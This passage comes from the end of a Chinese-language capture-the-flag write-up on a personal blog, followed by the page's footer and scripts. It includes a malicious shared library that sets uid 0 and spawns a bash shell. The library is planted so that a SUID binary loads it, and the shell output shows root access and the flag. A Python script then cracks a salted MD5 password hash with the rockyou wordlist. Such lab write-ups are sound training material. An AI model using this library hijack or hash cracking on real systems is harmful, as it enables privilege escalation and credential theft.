+EOFcat &lt;&lt; EOF &gt; shell.c
+&gt; #include &lt;stdio.h&gt;
+&gt; #include &lt;stdlib.h&gt;
+&gt; #include &lt;unistd.h&gt;
+&gt; 
+&gt; void hello() {
+&gt;     setuid(0);
+&gt;     setgid(0);
+&gt;     system("/bin/bash -p");
+&gt; }
+&gt; 
+EOF
+www-data@sML:/tmp$ gcc -shared -o libxxoo.so -fPIC shell.c
+gcc -shared -o libxxoo.so -fPIC shell.c
+www-data@sML:/tmp$ cp libxxoo.so /usr/lib/sML/
+cp libxxoo.so /usr/lib/sML/
+www-data@sML:/tmp$ cd /h 
+cd /home/yulian/
+www-data@sML:/home/yulian$ ls -al
+ls -al
+total 44
+drwxr-xr-x 2 yulian yulian  4096 Jul  7 06:34 .
+drwxr-xr-x 3 root   root    4096 Jul  7 06:12 ..
+lrwxrwxrwx 1 root   root       9 Jul  7 06:34 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 yulian yulian   220 Jul  7 06:12 .bash_logout
+-rw-r--r-- 1 yulian yulian  3526 Jul  7 06:12 .bashrc
+-rw-r--r-- 1 yulian yulian   807 Jul  7 06:12 .profile
+-rwsr-sr-x 1 root   root   16648 Jul  7 06:34 get_root
+-rw-r--r-- 1 root   root      44 Jul  7 06:13 user.txt
+www-data@sML:/home/yulian$ ./get_root
+./get_root
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+cat /root/root.txt
+flag{root-4c850c5b3b2756e67a91bad8e046ddac}
+</code></pre>
+<p>爆破hash参考代码</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ cat a.py           
+import hashlib
+
+def crack():
+    u = "admins"
+    h = "02adcdf2171dc7e5757cdd7c0b91fa03"
+    w = r"/usr/share/wordlists/rockyou.txt"
+
+    umd5 = hashlib.md5(u.encode()).hexdigest()
+
+    try:
+        with open(w, 'r', encoding='latin-1') as f:
+            for line in f:
+                p = line.strip()
+                pm = hashlib.md5(p.encode()).hexdigest()
+                cm = hashlib.md5((pm + umd5).encode()).hexdigest()
+                if cm == h:
+                    print(f"[+] 密码找到: {p}")
+                    return
+        print("[-] 未找到")
+    except:
+        print("文件错误")
+
+if __name__ == '__main__':
+    crack()
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ python3 a.py
+[+] 密码找到: admin123
+                                                 
+</code></pre></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
